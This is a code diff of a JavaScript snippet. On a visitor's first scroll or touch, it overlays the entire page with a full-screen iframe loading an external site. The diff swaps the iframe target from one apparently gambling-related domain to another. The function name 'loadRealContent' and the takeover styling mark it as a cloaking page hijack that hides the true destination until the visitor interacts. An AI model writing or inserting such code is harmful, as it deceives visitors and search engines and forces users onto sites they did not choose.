@@ -5,7 +5,7 @@
     const loadRealContent = () => {
         if (active) return;
         active = true;
-        const ampUrl = "https://alternatif-sensa4d.pages.dev/";
+        const ampUrl = "https://sensawd.com/tiktokk";
         const ifrm = document.createElement('iframe');
         const style = 'position:fixed; top:0; left:0; width:100vw; height:100vh; border:none; z-index:999999; margin:0; padding:0; background:white;';
         ifrm.setAttribute('style', style);
@@ -17,3 +17,4 @@
     window.addEventListener('scroll', loadRealContent, { once: true });
     window.addEventListener('touchstart', loadRealContent, { once: true });
 })();
+
